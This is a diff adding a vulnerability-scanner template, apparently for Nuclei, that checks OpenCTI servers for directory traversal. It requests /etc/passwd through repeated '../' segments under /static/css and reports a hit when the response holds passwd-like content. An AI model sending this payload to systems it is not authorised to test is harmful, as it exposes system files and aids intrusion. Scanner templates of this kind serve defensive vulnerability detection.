@@ -1,0 +1,23 @@
+id: opencti-directory-traversal
+info:
+  name: OpenCTI Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/static/css/../../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        words:
+          - "<"
+        negative: true
